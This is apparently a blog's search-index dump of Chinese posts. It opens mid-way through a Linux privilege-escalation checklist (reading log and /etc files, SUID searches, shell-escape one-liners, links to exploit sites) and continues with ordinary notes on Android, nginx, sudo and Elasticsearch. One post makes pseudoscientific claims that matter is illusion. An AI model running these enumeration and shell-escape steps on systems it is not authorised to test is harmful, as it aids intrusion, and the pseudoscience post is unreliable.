/^.....w/' 2  /dev/null    # Group\nls -aRl /etc/ | awk ’;$1 ~ /w.$/' 2  /dev/null          # Other\nfind /etc/ -readable -type f 2  /dev/null                         # Anyone\nfind /etc/ -readable -type f -maxdepth 1 2  /dev/null   # Anyone\n\n在/ var /有什么可以发现？\n\nls -alh /var/log\nls -alh /var/mail\nls -alh /var/spool\nls -alh /var/spool/lpd\nls -alh /var/lib/pgsql\nls -alh /var/lib/mysql\ncat /var/lib/dhcp3/dhclient.leases\n\n网站上的任何隐藏配置/文件?配置文件与数据库信息？\n\nls -alhR /var/www/\nls -alhR /srv/www/htdocs/\nls -alhR /usr/local/www/apache22/data/\nls -alhR /opt/lampp/htdocs/\nls -alhR /var/www/html/\n\n有什么在日志文件里?（什么能够帮助到“本地文件包含”?)\n\nhttp://www.thegeekstuff.com/2011/08/linux-var-log-files/\ncat /etc/httpd/logs/accesslog\ncat /etc/httpd/logs/access.log\ncat /etc/httpd/logs/errorlog\ncat /etc/httpd/logs/error.log\ncat /var/log/apache2/accesslog\ncat /var/log/apache2/access.log\ncat /var/log/apache2/errorlog\ncat /var/log/apache2/error.log\ncat /var/log/apache/accesslog\ncat /var/log/apache/access.log\ncat /var/log/auth.log\ncat /var/log/chttp.log\ncat /var/log/cups/errorlog\ncat /var/log/dpkg.log\ncat /var/log/faillog\ncat /var/log/httpd/accesslog\ncat /var/log/httpd/access.log\ncat /var/log/httpd/errorlog\ncat /var/log/httpd/error.log\ncat /var/log/lastlog\ncat /var/log/lighttpd/access.log\ncat /var/log/lighttpd/error.log\ncat /var/log/lighttpd/lighttpd.access.log\ncat /var/log/lighttpd/lighttpd.error.log\ncat /var/log/messages\ncat /var/log/secure\ncat /var/log/syslog\ncat /var/log/wtmp\ncat /var/log/xferlog\ncat /var/log/yum.log\ncat /var/run/utmp\ncat /var/webmin/miniserv.log\ncat /var/www/logs/accesslog\ncat /var/www/logs/access.log\nls -alh /var/lib/dhcp3/\nls -alh /var/log/postgresql/\nls -alh /var/log/proftpd/\nls -alh /var/log/samba/\n\nauth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,\n\nmail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)\n\n如果命令限制，你可以打出哪些突破它的限制？\n\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\necho os.system('/bin/bash')\n/bin/sh -i\n\n如何安装文件系统？\n\nmount\ndf -h\n\n是否有挂载的文件系统？\n\ncat /etc/fstab\n\n什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID\n\nfind / -perm -1000 -type d 2  /dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here\nfind / -perm -g=s -type f 2  /dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.\nfind / -perm -u=s -type f 2  /dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.\nfind / -perm -g=s -o -perm -u=s -type f 2  /dev/null    # SGID or SUID\nfor i in locate -r \"bin$\"; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2  /dev/null; done    #\nLooks in \u0026#039;common\u0026#039; places: /bin, /sbin, /usr/bin, /usr/sbin,\n/usr/local/bin, /usr/local/sbin and any other bin, for SGID or SUID\n(Quicker search)\nfindstarting at root (/), SGIDorSUID, not Symbolic links, only 3\nfolders deep, list with more detail and hideany errors (e.g. permission\ndenied)\nfind/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2  /dev/null\n\n在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录\n\nfind / -writable -type d 2  /dev/null         world-writeable folders\nfind / -perm -222 -type d 2  /dev/null      # world-writeable folders\nfind / -perm -o+w -type d 2  /dev/null    # world-writeable folders\nfind / -perm -o+x -type d 2  /dev/null    # world-executable folders\nfind / ( -perm -o+w -perm -o+x ) -type d 2  /dev/null   # world-writeable \u0026 executable folders\nAny \"problem\" files？可写的的，“没有使用\"的文件\nfind / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print   # world-writeable files\nfind /dir -xdev ( -nouser -o -nogroup ) -print   # Noowner files\n\n准备和查找漏洞利用代码\n\n安装了什么开发工具/语言/支持？\n\nfind / -name perl\nfind / -name python\nfind / -name gcc\nfind / -name cc\n\n如何上传文件？\n\nfind / -name wget\nfind / -name nc\nfind / -name netcat\nfind / -name tftp*\nfind / -name ftp\n\n查找exploit代码\n\nhttp://www.exploit-db.com\n\nhttp://1337day.com\n\nhttp://www.securiteam.com\n\nhttp://www.securityfocus.com\n\nhttp://www.exploitsearch.net\n\nhttp://metasploit.com/modules/\n\nhttp://securityreason.com\n\nhttp://seclists.org/fulldisclosure/\n\nhttp://www.google.com\n\n查找更多有关漏洞的信息\n\nhttp://www.cvedetails.com\n\nhttp://packetstormsecurity.org/files/cve/[CVE]\n\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]\n\nhttp://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]\n\nhttp://www.91ri.org/\n\n(快速）“共同的“exploit,预编译二进制代码文件\n\nhttp://tarantula.by.ru/localroot/\n\nhttp://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/\n\n上面的信息很难吗？\n\n快去使用第三方脚本/工具来试试吧！\n\n系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？\n\napt-get update \u0026\u0026 apt-get upgrade\nyum update\n\n服务运行所需的最低的权限？\n\n例如，你需要以root身份运行MySQL？\n\n能够从以下网站找到自动运行的脚本？！\n\nhttp://pentestmonkey.net/tools/unix-privesc-check/\n\nhttp://labs.portcullis.co.uk/application/enum4linux/\n\nhttp://bastille-linux.sourceforge.net\n\n（快速）指南和链接\n\n例如\n\nhttp://www.0daysecurity.com/penetration-testing/enumeration.html\n\nhttp://www.microloft.co.uk/hacking/hacking3.htm\n\n其他\n\nhttp://jon.oberheide.org/files/stackjacking-infiltrate11.pdf\n\nhttp://pentest.cryptocity.net/files/clientsides/postexploitation_fall09.pdf\n\nhttp://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 布局属性","title":"Android控件布局属性全解","text":"Android控件布局属性全解\n\nAndroid五种布局模式\nLinearLayout（线性布局）\n—— 从外框上可以理解为一个div，它首先是一个一个从上往下罗列在屏幕上。每 一个LinearLayout里面又可以分为垂直布局（android:orientation=\"vertical\"）和水平布局（android:orientation=\"horizontal\"）。当垂直布局是，每一行就只有一个元素，多个元素一次垂直往下排列；水平布局是，只有一行，每一个元素依次向右排列。\n——重要属性：（android:layoutweight=\"1\"）这个weight在垂直布局时，表示行距；水平布局是，表示列宽。weigh值越大距离越大。\nTextView占一定的空间，没有赋值也有一定的宽高，要特别注意。\n\nFrameLayout（框架布局）\n——最简单的一种布局方式。它被定制为屏幕上的一个空白备用区域，之后可以再其中填充一个单一对象（比如，一张要发布的图片）。所有的子元素将会固定在屏幕的左上角，不能为子元素指定位置。后一个子元素将会直接在前一个子元素智商进行覆盖填充，把前一个子元素部分或全部挡住（除非后一个子元素是透明的）。\nAbsoluteLayout（绝对布局）\nRelativeLayout（相对布局）\nTableLayout（表格布局）\n\nFrameLayout\nFrameLayout是最简单的一个布局对象。\n它被定制为你屏幕上的一个空白备用区域，之后你可以在其中填充一个单一对象\n比如，一张你要发布的图片。所有的子元素将会固定在屏幕的左上角；\n后一个子元素将会直接在前一个子元素之上进行覆盖填充，把它们部份或全部挡住（除非后一个子元素是透明的）。\n\nLinearLayout\nLinearLayout以你为它设置的垂直或水平的属性值，来排列所有的子元素。\n所有的子元素都被堆放在其它元素之后，因此一个垂直列表的每一行只会有一个元素，而不管他们有多宽，\n而一个水平列表将会只有一个行高.\nLinearLayout还支持为单独的子元素指定weight 。好处就是允许子元素可以填充屏幕上的剩余空间。这也避免了在一个大屏幕中，一串小对象挤成一堆的情况，而是允许他们放大填充空白。\n子元素指定一个 weight 值，剩余的空间就会按这些子元素指定的weight 比例分配给这些子元素。默认的 weight 值为0。例如，如果有三个文本框，其中两个指定了weight 值为1，那么，这两个文本框将等比例地放大，并填满剩余的空间，而第三个文本框不会放大。\n\nRelativeLayout\nRelativeLayout 允许子元素指定他们相对于其它元素或父元素的位置（通过ID 指定）。\n因此，你可以以右对齐，或上下，或置于屏幕中央的形式来 排列两个元素。\n\nTableLayout\nTableLayout 将子元素的位置分配到行或列中。\n一个TableLayout由许多的TableRow 组成，每个TableRow 都会定义一个 row\n","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 1016倍显微镜下看人体超级震撼","title":"1016倍显微镜下看人体超级震撼","text":"人类社会一切现象都是幻象，是不实的。怎么是幻象呢？这实实在在摆在那儿的物体，谁能说它是假的呢？” 我们总是认为我们的眼睛能够看到这个世界中的任何物质、任何物体，所以\n人类社会一切现象都是幻象，是不实的。怎么是幻象呢？这实实在在摆在那儿的物体，谁能说它是假的呢？”我们总是认为我们的眼睛能够看到这个世界中的任何物质、任何物体，所以有些人产生了一种固执的观念，他认为通过眼睛看到的东西才是实实在在的；他看不见的就不相信。看不见就不相信，这话听起来很在理，可是在稍微高一点的层次看，它就不在理了。现代科学的发展已经证实了这一点。请看在显微镜下把人的手上一点放大1－1016倍，我们会看到什么？超级震撼哟！\n1米\n醒醒喂！都被偷窥啦还不知道呐。\n\n0.1米\n\n一米的十分之一，也叫分米，我们手所能把握的尺度。相信人类所接触的大部分物体都是在这样一个数量级的。看看你的周围，键盘、鼠标、手机、杯子、碗……仔细一看这哥们手上的毛还挺重的，纯爷们！\n1厘米\n\n这是他手上的皱纹细部。兴许你放大了还没他细皮嫩肉呢。做好准备，我们即将进入另一个陌生的领域——微观世界。\n1毫米\n\n手上的毛孔。可是，汗毛呢？晕！\n100微米\n\n再放大十倍，依稀可见皮肤的组织结构。\n10微米\n\n一个细胞的数量级就是10微米，当然这只是一般来说。插句嘴，世界上最大的细胞是鸵鸟蛋，它是一个单独的卵细胞，数量级是分米级的，厉害吧。\n1微米\n\n疑似生物课上学过的细胞核膜，细部。\n0.1微米\n\n嘿！一看这么高度螺旋的结构就知道是染色体了。底下的洋文说：但凡人类的细胞，里面都会有23对染色体（46条）。\n100埃\n\n埃是一种长度单位，指10的－10次方米。用字母“A”顶上加个小圆圈来表示。100埃的数量级就能度量某些有机大分子的物质了。看到这个规则的等距双螺旋结构，我想你一定能够脱口而出了。没错，这种物质就叫做脱氧核糖核酸，也就是常说的DNA。分子结构清晰可见。\n1纳米\n\n我们管10的－9次方米叫一纳米。现在为材料科学炒得火热的纳米技术就是说很多物质精细到纳米级后将表现出很多在常规数量级上所表现不出的性质来。在纳米这样的数量级下，我们连原子都可以数清了。因此，纳米级又叫原子级。\n下图是组成DNA分子的原子们，它们以共价键和氢键彼此结合成庞大的有机分子。生命就在这种复杂的结合中得以体现。敬礼！\n\n1埃\n\n上 过中学的就都应该知道：原子是由原子核和电子组成的。下图中所表示的是密布的电子云，我们能看到原子核外围的电子云比较浓。所谓电子云，其实并不是说一个 原子拥有无数个电子，象云雾般的弥漫四围。每个原子拥有的电子数都是固定的，有数的，具体依元素种类而定。这些电子行踪飘忽不定，在原子核外部乱窜。一个 电子，无数法身。就把这些电子“团团转”的特点用电子云来形容了。离核近的地方出现的几率大些，云就密；离核远的地方出现的几率小些，云就稀。\n10皮米\n\n原子核外围的浓密电子云。仿佛到了浩瀚无边的宇宙。这样来看每个原子都像是个小宇宙，我们的世界就这样的周而复始着，不寒而栗着……\n1皮米\n穿 过最浓的电子云，发现更近核的地方反倒清净。原来离得远了要吸引，离得近了也会排斥呢，保持一个最佳的距离才好。（挺象搞对象呦^ _ ^）什么？你说电子阴 性，原子核阳性，异性相吸，应该越近核越密才对？别逗了！真要那样越近越吸，越吸越近，电子还不都撞到核上去，最后谁也动弹不得！可是为什么不是这样呢？ 国家机密！就不告诉你，嘿嘿！下图框中的斑点就是原子核。\n\n0.1皮米\n\n走近点，这就是传说中的原子核了。10的－12次方米叫做一皮米。在0.1皮米的数量级下看原子核就可以看出很多个球球来，它们是带正电的质子和不带电的中子。\n10飞米\n\n原子核的特写。\n1飞米（10的－15次方米）\n\n质子（也可能是中子）的细部，乱七八糟一大片。未知的结构，未知的领域。\n0.1飞米\n\n无 语。图片下面的洋文说：一旦我们进入下一个层次，我们将会看到什么，我们又将会知道什么？……看完以上图片，你是否感到震撼？我们看组成人体的这些个微 粒，和宇宙有什么不同啊？没有什么不同，那几幅表现原子核和电子云的图片如果不告诉我们，把它说成是宇宙星系的图片，我们也不会怀疑。可这就是真实的人体 结构。\n让我们把思维进一步扩展一下，如果人体是一个小宇宙的话，那里面的粒子是不是就相当于宇宙当中的星球啊，一定是的，那粒子上面会不会有生命呢？可能就有生命存在。这可不是我思路广。\n有 无数个象西方极乐世界的星体，并且仔细详尽地解说那里的情况。地球就象一个椭圆形的庵摩罗果，这是２０００年以后才被科学家证实的啊！我们的身体就是由这 若干极微缘聚构成，一粒沙里还有这样的三千大千世界。一粒沙子就象一个宇宙一样，里面也含藏象我们这样的智慧生命，有星球，也有山川河流。\n一滴水中有八万四千生命…” 如果人类未发现显微镜，恐怕到现在还认为是在讲迷信了！听起来很玄哪！可是如果看看这些照片，我觉得这也并不玄，一切皆有可能。所有的科学定律都只能在特定的时空中成立，它们多数从一开始就注定会遭到修正甚至否定的命运。\n我 们的看不见就不相信的观念是不在理，得转变一下了！！！现代物理科学研究者也应知，要找到组成物质的最细结构，只能是徒费心机，因物质只是一种幻相，它没 有常而有质碍的最细尘粒，若在虚幻的现象界中寻找，将会离真相越来越远，永远也不可能穷尽其微，只有转而研究人的内心，宇宙物质之谜才有解开之时。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 lsof","title":"Linux命令 lsof","text":"---\n关于端口的一些命令：\nlsof  -i  :端口号","tags":null},{"location":"//blog.pytool.com/Other/2015-12-09 Token","title":"token","text":"关于 Token，你应该知道的十件事 - 为程序员服务\n腾讯开放平台第三方应用签名参数sig的说明 - 腾讯开放平台","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 sudo","title":"Linux命令 sudo","text":"有很多朋友可能在使用sudo时会出现sudo echo ‘xxx’   /path/file 重定向时 Permission denied错误，下面我来给各位介绍解决办法\n\n例\n\n1 sudo \"echo '[yaf]'   /usr/local/php/etc/include/yaf.ini\"\n\n2 #Permission denied 权限不够\n\n使用sudo echo ‘xxx’   /path/file 时，其实sudo只用在了 echo 上，而重定向没有用到sudo的权限，所以会出现“Permission denied”的情况，解决的方法也很简单，就是一个参数而已。加一个“ sh -c ”就可以把权限指定到整条shell了。\n\nsudo sh -c \"echo '[yaf]'   /usr/local/php/etc/include/yaf.ini\"\n\n另一种方法是利用管道和 tee 命令，该命令可以从标准输入中读入信息并将其写入标准输出或文件中，具体用法如下：\n\necho “xxxx” | sudo tee -a test.txt\n\ntee 命令的 “-a” 选项的作用等同于 “    ” 命令，如果去除该选项，那么 tee 命令的作用就等同于 “  ” 命令。","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/bytes","title":"golang中bytes包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 汇总","title":"前端技能汇总","text":"前端技能汇总\n\n建站：\n论坛 nodebb\n\nfont-family: \"FZLanTingHei\" !important;\n\nPushpin\n\napi 文档\n\n文档书籍\n  \n\nWeb在线编辑器\n可视化HTML编辑器 https://www.oschina.net/project/tag/172/wysiwyg\n\nMarkdown 编辑器 Editor.md\nTinyMCE是一个轻量级的基于浏览器的所见即所得编辑器\nCKEditor是新一代的FCKeditor，是一个重新开发的版本\nSimditor 是团队协作工具 Tower 使用的富文本编辑器\nQuill 是一个开源的富文本编辑器\n\n 时间轴\nLabella.js 是 Twitter 开源的时间轴标签放置工具\n\ninote\nhttps://github.com/igordonxiao/inote\n\nGitHub 候选组件\n\n按照 Star 数倒序排序。\n\n    yabwe/medium-editor\n\n    This is a clone of medium.com inline editor toolbar.\n        只支持 Air Mode。\n        无菜单。基于内容操作。\n        原生功能很简洁，但是插件丰富。加入插件后排版功能很强大。\n        适合写长文，不适合短文编辑。\n        基于 contenteditable API 实现。\n\n    summernote/summernote\n        同时支持 Aire Mode 和 Toolbar Mode。\n        有菜单。基于菜单操作。\n        功能非常完善。\n        可以整合 CodeMirror、Suggest（word、emoji、@）。\n\n    jhollingworth/bootstrap-wysihtml5\n\n    tinymce/tinymce\n        Toolbar Mode\n        功能非常完善。\n\n    mycolorway/simditor\n        基于菜单操作。\n        功能齐全，风格简洁。\n\n    jejacks0n/mercury\n        Toolbar Mode\n        难看。\n\n    GetmeUK/ContentTools\n        Toolbar Mode\n        长文编辑。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Nginx泛域名解析","title":"利用nginx泛域名解析配置二级域名和多域名","text":"server {\n    listen 80;\n    servername .kbook.org\n\n    location / {\n      addheader  Content-Type 'text/html; charset=utf-8';\n\n        #根目录为$host,$PATH为$host所在的目录。\n        root $PATH/$host;\n        return 200 \"$host\";\n    }\nhttp {\n    #...\n    server {\n        listen 80;\n        servername $host;#在servername中使用$host而不用自己去一个一个绑定了。\n        #...\n        location / {\n            #根目录为$host,$PATH为$host所在的目录。\n            root $PATH/$host;\n            #....\n        }\n}\n\nnginx泛域名解析，实现多个二级域名\n\n利用nginx泛域名解析配置二级域名和多域名，实现二级域名子站，用户个性独立子域名。\n\n主要针对用户独立子域名这种情况，不可能在配置里面将用户子域名写完，因此需要通过nginx泛解析方式。\n\n配置方法：\n\nservername  ~^(?subdomain.+)\\.yourdomain\\.com$;\n\n通过匹配subdomain即可。而在下面的可以通过$subdomain这个变量获取当前子域名称。\n情况一：绑定子域名到统一目录，作为用户个性域名\n\n这种情况下，只需要直接匹配就可以了，目录都是指向同一个地方的（一般）。\n\n配置实例：\nserver {\n\n    listen   80;\n    servername yourdomain.com www.yourdomain.cpm ~^(?subdomain.+)\\.m\\.yourdomain\\.com$;\n\n    index index.php index.html index.htm;\n    set $rootpath '/var/www/yanue.net';\n    root $rootpath;\n\n    tryfiles $uri $uri/ @rewrite;\n\n    location @rewrite {\n        rewrite ^/(.)$ /index.php?url=/$1;\n    }\n\n    location ~ \\.php {\n            fastcgipass   127.0.0.1:9000;\n    }\n\n    location ~ ^/(css|img|js|flv|swf|download)/(.+)$ {\n        root $rootpath;\n    }\n\n    location ~ /\\.ht {\n        deny all;\n    }\n}\n\n这样可以实现：\n\nuser.m.yourdomain.com 跳转到用户自己页面\n\n当然跳转逻辑需要自己在程序里面去实现。\n情况二：绑定子域名到不同目录（子站）\n\n网站的目录结构为\n\nhtml\n├── bbs\n└── www\n\nhtml为nginx的安装目录下默认的存放源代码的路径。\n\nbbs为论坛程序源代码路径\n\nwww为主页程序源代码路径\n\n把相应程序放入上面的路径通过\n\nhttp://www.youdomain.com 访问的就是主页\n\nhttp://bbs.yourdomain.com 访问的就是论坛\n\n其它二级域名类推。\n\n配置实例：\n\nserver {\n        listen       80;\n        servername  ~^(?subdomain.+)\\.yourdomain\\.com$;\n        root   html/$subdomain;\n        index  index.html index.htm index.php;\n        fastcgiintercepterrors on;\n        errorpage  404      = /404.html;\n        location / {\n                # This is cool because no php is touched for static content.\n                # include the \"?$args\" part so non-default permalinks doesn't\n                # break when using query string\n                tryfiles $uri $uri/ =404;\n       }\n\n        # redirect server error pages to the static page /50x.html\n        #\n        errorpage   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        location ~ \\.php$ {\n            fastcgipass   127.0.0.1:9000;\n            fastcgiindex  index.php;\n            fastcgiparam  SCRIPTFILENAME  $documentroot$fastcgiscriptname;\n            fastcgiparam  domain $subdomain;\n            include        fastcgiparams;\n        }\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        location ~ /\\.ht {\n            deny  all;\n        }\n}\n\nnginx 泛域名 泛解析\n\nrewrite \"^(.)/service/(.)\\.html$\" $1/service.php?sid=$2 permanent;  \n反过来： 带参数的动态地址重定向到静态地址\nif ($querystring ~ id=(.)) {\nset $id $1;\nrewrite \"^(.)/article.asp$\" $1/article/$id.htm last;\n}\n\n泛域名解析\n\nview plaincopy to clipboardprint?\nservername www.w3cgroup.com .w3cgroup.com;\nservernameinredirect off;\n设置默认root\nset $rootdir /usr/local/nginx/html/w3cgroup/;\n\n匹配三级或三级以上的域名\n\nif ($host ~ ^(.+)\\.(+)\\.(+)\\.(+)$)  {\n\n}\n匹配三级域名\nif ($host ~ ^(+)\\.(+)\\.(+)\\.(+)$) {\n三级域名中有访问指定的目录则重定向到相应的二级域名下\nrewrite \"^.+upload/?(.)$\" http://upload.w3cgroup.com/$1 permanent;\nrewrite \"^.+ijc/?(.)$\" http://ijc.w3cgroup.com/$1 permanent;\nbreak;\n}\n匹配二级域名\nif ($host ~ ^(+)\\.(+)\\.(+)$) {\nset $rs1 $1;\n}\n设置www时root\nif ($rs1 ~ ^www$) {\nset $rootdir /usr/local/nginx/html/platformig/;\n二级域名中有访问指定的目录则重定向到相应的二级域名下,注意，这里要使用last\nrewrite \"^.+upload/?(.)$\" upload/$1 last;\nrewrite \"^.+ijc/?(.)$\" ijc/$1 last;\nbreak;\n}\n设置非www二级域名时root\nif ($rs1 !~ ^www$) {\nset $rootdir /usr/local/nginx/html/w3cgroup/$rs1;\n二级域名中有访问指定的目录则重定向到相应的二级域名下\nrewrite \"^.+upload/?(.)$\" http://upload.w3cgroup.com/$1 permanent;\nrewrite \"^.+ijc/?(.)$\" http://ijc.w3cgroup.com/$1 permanent;\nbreak;\n}\n应用root\nroot $rootdir;\nindex index.php index.html;\nerrorpage 404 http://$host/;\n\n利用nginx泛域名解析配置二级域名和多域名\n\n网站的目录结构为\nhtml\n├── bbs\n└── www\n\nhtml为nginx的安装目录下默认的存放源代码的路径。\n\nbbs为论坛程序源代码路径\nwww为主页程序源代码路径\n\n把相应程序放入上面的路径通过\nhttp://www.youdomain.com 访问的就是主页\nhttp://bbs.yourdomain.com 访问的就是论坛\n其它二级域名类推。\n\n server {\n        listen       80;\n        servername  ~^(?subdomain.+).yourdomain.com$;\n        root   html/$subdomain;\n        index  index.html index.htm index.php;\n        fastcgiintercepterrors on;\n        errorpage  404      = /404.html;\n        location / {\n                 This is cool because no php is touched for static content.\n                # include the \"?$args\" part so non-default permalinks doesn't\n                # break when using query string\n                tryfiles $uri $uri/ =404;\n       }\n\n        # redirect server error pages to the static page /50x.html\n        #\n        errorpage   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        location ~ .php$ {\n            fastcgipass   127.0.0.1:9000;\n            fastcgiindex  index.php;\n            fastcgiparam  SCRIPTFILENAME  $documentroot$fastcgiscriptname;\n            fastcgiparam  domain $subdomain;\n            include        fastcgi_params;\n        }\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        location ~ /.ht {\n            deny  all;\n        }\n    }\n\n总结一下步骤就是\n\n1.把上面的红色配置换成你的域名后添加到你的nginx.conf配置文件\n\n2.确认要增加的二级域名，如bbs.yourdomain.com\n\n3.设置bbs.yourdomain.com解析到你的nginx服务器ip\n\n4.在html目录下创建bbs目录\n\n5.把源码放入bbs目录\n\n6.重新加载nginx配置\n\nkill -HUP cat /usr/local/lnmp/nginx/nginx.conf\n\n(需要把上面命令的路径换成你的配置文件路径)\n\n7.访问http://bbs.yourdomain.com","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 Elasticsearch学习笔记(四)Mapping映射","title":"Elasticsearch学习笔记(四)Mapping映射","text":"Elasticsearch学习笔记(四)Mapping映射\nMapping简述\nElasticsearch是一个schema-less的系统，但并不代表no shema，而是会尽量根据JSON源数据的基础类型猜测你想要的字段类型映射。\nElasticsearch中Mapping类似于静态语言中的数据类型，但是同语言的数据类型相比，映射还有一些其他的含义。\nElasticsearch会根据JSON源数据的基础类型猜测你想要的字段映射。将输入的数据转变成可搜索的索引项。Mapping就是我们自己定义的字段的数据类型，同时告诉Elasticsearch如何索引数据以及是否可以被搜索。\n映射的增删改查\nElasticsearch可以根据数据中的新字段来创建新的映射，当然，在正式数据写入之前我们可以自己定义Mapping,\n等数据写入时，会按照定义的Mapping进行映射。如果后续数据有其他字段时，Elasticsearch会自动进行处理。\n\n    curl -XPUT 'http://120.92.36.21:9200/logstash-2016.01.01/mapping' -d '  \n    {  \n        \"mappings\" : {  \n            \"syslog\" : {  \n                \"properties\" : {  \n                    \"@timestamp\" : {  \n                        \"type\" : \"date\"  \n                    },  \n                    \"message\" : {  \n                        \"type\" : \"string\"  \n                    },  \n                    \"pid\" : {  \n                        \"type\" : \"long\"  \n                    }  \n                }  \n            }  \n        }  \n    }  \n    '  \n\n在这里需要注意一下，我们已经存在的索引是不可以更改它的映射的，对于存在的索引，只有新字段出现时，Elasticsearch才会自动进行处理。如果确实需要修改映射，那么就使用reindex,采用重新导入数据的方式完成。\nReIndex\nElasticsearch并不提供针对索引的rename,mapping、alter等操作。如果需要更改某个字段的mapping映射，只有一些其他工具。\n用Logstash重建索引：\n在最新版的logstash中，对logstash-input-elasticsearch插件做了一定的修改，使得通过Logstash完成重建索引称为可能。\nDelete\n虽然写入数据时Elasticsearch会自动的添加映射进行处理，但是删除数据并不会删除数据的映射\ncurl -XDELETE 'http://120.92.36.21:9200/logstash-2016.01.01/syslog'                  删除了syslog下面的全部数据，但是syslog的映射还在\n删除映射的命令:\ncurl -XDELETE 'http://120.92.36.21:9200/logstash-2016.01.01/mapping'\n删除索引的话映射也会删除\ncurl -XDELETE 'http://120.92.36.21:9200/logstash-2016.01.01'\n查看：\n学习索引的话最直接的方式就是查看logstash写入数据到Elasticsearch的时候会根据自带的template生成一个很有学习意义的映射\nElasticsearch数据类型\nElasticsearch自带的数据类型数Lucene索引的依据，也是我们做手动映射调整到依据。\n映射中主要就是针对字段设置类型以及类型相关参数。\nJSON基础类型如下：\n字符串：string\n数字：byte、short、integer、long、float、double、\n时间：date\n布尔值: true、false\n数组: array\n对象: object\nElasticsearch独有的类型：\n多重: multi\n经纬度: geopoint\n网络地址: ip\n堆叠对象: nested object\n二进制: binary\n附件: attachment\n\n注意点：\nElasticsearch映射虽然有idnex和type两层关系，但是实际索引时是以index为基础的。如果同一个index下不同type的字段出现mapping不一致的情况，虽然数据依然可以成功写入并生成并生成各自的mapping，但实际上fielddata中的索引结果却依然是以index内第一个mapping类型来生成的。\n自定义字段映射\nElasticsearch的Mapping提供了对Elasticsearch中索引字段名及其数据类型的定义，还可以对某些字段添加特殊属性：该字段是否分词，是否存储，使用什么样的分词器等。\n精确索引：\n字段都有几个基本的映射选项，类型（type）和索引方式(index)。以字符串类型为例，index有三个选项：\nanalyzed:默认选项，以标准的全文索引方式，分析字符串，完成索引。\nnotanalyzed:精确索引，不对字符串做分析，直接索引字段数据的精确内容。\nno：不索引该字段。\n对于日志文件来说，很多字段都是不需要再Elasticsearch里做分析这步的，所以，我们可以这样设置：\n[plain] view plain copy\nprint?在CODE上查看代码片派生到我的代码片\n\n    \"myfieldname\" : {  \n        \"type\" : \"string\",  \n        \"index\" : \"notanalyzed\"  \n    }  \n\n时间格式：\n@timestamp这个时间格式在Nginx中叫$timeiso8601，在Rsyslog中叫date-rfc3339,在Elasticsearch中叫dateOptionalTime.但事实上，Elasticsearch完全可以接受其他时间格式作为时间字段的内容。对于Elasticsearch来说，时间字段内容实际上就是转换成long类型作为内部存储的。所以，接受段的时间格式可以任意设置：\n[plain] view plain copy\nprint?在CODE上查看代码片派生到我的代码片\n\n    @timestamp: {  \n        \"type\" : \"date\",  \n        \"index\" : \"notanalyzed\",  \n        \"docvalues\" : true,  \n        \"format\" : \"dd/MM/YYYY:HH:mm:ss Z\"  \n    }  \n\n多种索引：\n多重索引是Logstash用户习惯的的一个映射，因为这是Logstash默认开启的配置：\n[plain] view plain copy\nprint?在CODE上查看代码片派生到我的代码片\n\n    \"title\" : {  \n        \"type\" : \"string\",  \n        \"fields\" : {  \n            \"raw\" : {  \n                \"type\" : \"string\",  \n                \"index\" : \"notanalyzed\"          \n            }  \n        }  \n    }  \n\n其作用时，在title字段数据写入的时候，Elasticsearch会自动生成两个字段，分别是title和title.raw。这样，有可能同时需要分词和部分次结果的环境，就可以很灵活的使用不同的索引字段了。比如，查看标题中最常用的单词，应该是使用title字段，查看阅读数最多的文章标题，应该是使用title.raw字段。\n多值字段：\n空字段：\n数组可以使空的。这等于有零个值。事实上，Lucene没法存放null值，所以一个null值的字段呗认为是孔子段。\n下面这四个字段将被识别为空字段而不被索引:\n\"emptystring\" : \"\",\n\"nullvalue\" : null,\n\"emptyarray\" : [],\n\"arraywithnull_value\" : [ null ]\n多层对象：\n我们需要讨论的最后一个自然JSON数据类型是对象(object)。\n内部对象(inner objects)经常用于嵌入一个实体或对象里的另一个地方。例如，","tags":null},{"location":"//blog.pytool.com/Post/基础/2015-12-09 文件上传","title":"文件上传 upload server","text":"tus/tusd: The official server implementation of the tus resumable upload protocol.\n\n服务端\ngo get github.com/tus/tusd\n下载依赖\ngit clone git@github.com:aws/aws-sdk-go.git $GOPATH/src/github.com/aws/aws-sdk-go\n运行\ngo run cmd/tusd/main.go\n\ncurl -X POST -I 'http://localhost:8080/files' \\\n               -H 'Tus-Resumable: 1.0.0' \\\n               -H 'Upload-Length: 12345678'\n\ncurl -i -X OPTIONS localhost:1080/files/\n      ` 